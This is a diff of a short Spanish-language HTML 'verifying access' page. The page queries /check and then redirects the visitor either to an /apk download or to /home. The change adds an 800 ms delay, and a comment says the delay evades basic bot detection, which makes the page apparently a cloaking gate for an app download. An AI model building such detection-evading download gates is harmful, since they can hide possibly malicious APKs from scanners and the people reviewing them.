@@ -2,26 +2,24 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Acceso</title>
+  <title>Verificando acceso</title>
 </head>
 <body>
-  <h1>Verificando acceso...</h1>
+  <h2>Verificando acceso...</h2>
 
   <script>
-    async function checkAccess() {
-      const res = await fetch("/check");
-      const data = await res.json();
-
-      console.log("Resultado:", data);
-
-      if (data.allow) {
-        window.location.href = "/apk";
-      } else {
-        window.location.href = "/home";
-      }
-    }
-
-    checkAccess();
+    // pequeña espera → evita detección básica de bots
+    setTimeout(() => {
+      fetch("/check")
+        .then(r => r.json())
+        .then(data => {
+          if (data.allow) {
+            window.location.href = "/apk";
+          } else {
+            window.location.href = "/home";
+          }
+        });
+    }, 800);
   </script>
 </body>
 </html>
